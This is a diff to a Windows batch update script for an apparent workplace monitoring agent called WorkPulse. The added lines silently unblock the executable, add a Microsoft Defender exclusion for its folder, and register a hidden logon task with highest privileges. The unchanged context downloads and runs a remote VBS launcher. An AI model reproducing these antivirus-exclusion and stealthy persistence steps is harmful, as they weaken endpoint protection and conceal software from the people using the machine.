@@ -59,10 +59,21 @@ if not exist "C:\WorkPulse\WorkPulse-Agent.exe" (
 echo  Downloading latest launcher...
 powershell -NoProfile -Command "Invoke-WebRequest -Uri '!SERVER_URL!/download/launch-vbs' -OutFile 'C:\WorkPulse\launch.vbs' -UseBasicParsing" >nul 2>&1
 
-echo  Restarting agent...
-start "" wscript.exe "C:\WorkPulse\launch.vbs"
-timeout /t 2 /nobreak >nul
-
+echo  Trusting agent executable...
+powershell -NoProfile -Command "Unblock-File -Path 'C:\WorkPulse\WorkPulse-Agent.exe'" >nul 2>&1
+powershell -NoProfile -Command "Add-MpPreference -ExclusionPath 'C:\WorkPulse\'" >nul 2>&1
+echo  Fixing Task Scheduler entry...
+schtasks /create /tn "WorkPulseAgent" /tr "wscript.exe //B \"C:\WorkPulse\launch.vbs\"" /sc onlogon /rl highest /f >nul 2>&1
+echo  Restarting agent silently...
+wscript.exe //B "C:\WorkPulse\launch.vbs"
+timeout /t 3 /nobreak >nul
+tasklist /FI "IMAGENAME eq WorkPulse-Agent.exe" 2>nul | find /I "WorkPulse-Agent.exe" >nul
+if %errorlevel% neq 0 (
+    echo  VBS blocked, switching to Task Scheduler...
+    schtasks /create /tn "WorkPulseAgent" /tr "wscript.exe //B \"C:\WorkPulse\launch.vbs\"" /sc onlogon /rl highest /f >nul 2>&1
+    schtasks /run /tn "WorkPulseAgent" >nul 2>&1
+    echo  Task Scheduler configured
+)
 echo.
 echo  ================================================
 echo   Update Complete!
